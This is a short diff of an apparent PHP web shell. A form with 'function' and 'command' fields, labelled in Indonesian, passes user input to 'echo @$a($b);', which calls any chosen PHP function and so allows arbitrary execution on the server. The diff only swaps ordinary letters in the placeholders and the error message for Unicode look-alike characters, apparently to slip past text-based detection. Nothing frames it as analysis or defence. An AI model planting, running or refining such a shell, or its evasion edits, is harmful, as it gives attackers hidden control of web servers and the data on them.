@@ -2,8 +2,8 @@
 <html>
 <body style="background:#000; color:#0f0;">
     <form method="POST">
-        <input type="text" name="x" placeholder="Fungsi">
-        <input type="text" name="y" placeholder="Perintah">
+        <input type="text" name="x" placeholder="Ƒungsi">
+        <input type="text" name="y" placeholder="Ṕerintah">
         <input type="submit" value="Run">
     </form>
     <pre>
@@ -44,7 +44,7 @@
                 echo @$a($b);
             }
         } else {
-            echo "Error: Execution Blocked";
+            echo "Ērror: Ēxecution Blőcked";
         }
     }
     ?>
